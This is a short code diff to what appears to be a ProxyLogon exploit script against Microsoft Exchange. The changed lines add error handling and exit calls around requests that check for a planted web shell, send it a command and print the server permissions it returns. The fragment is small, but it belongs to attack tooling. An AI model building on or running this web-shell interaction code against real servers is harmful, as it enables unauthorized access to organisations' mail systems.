@@ -304,8 +304,10 @@ def proxyLogon(sid):
     data = requests.get(shell_url, verify=False, proxies=proxies)
     if data.status_code != 200:
         print("[-] request shell failure ")
+        exit()
     elif "<div class=\"errorHeader\">404</div>" in data.text:
         print("[-] request shell failure , 404 shell ! ")
+        exit()
     elif "OAB (Default Web Site)" in data.text:
         print("\n |")
         print("[*]Got shell success")
@@ -314,6 +316,10 @@ def proxyLogon(sid):
     data = requests.get(shell_url, verify=False, data=post_data, proxies=proxies)
     if data.status_code == 500:
         print("[-] exec error !\n")
+    elif data.status_code != 200:
+        print("[-] request shell failure ")
+    elif "<div class=\"errorHeader\">404</div>" in data.text:
+        print("[-] request shell failure , 404 shell ! ")
     else:
         print("[+] 权限如下：" + data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ",
                                                                                  ""))
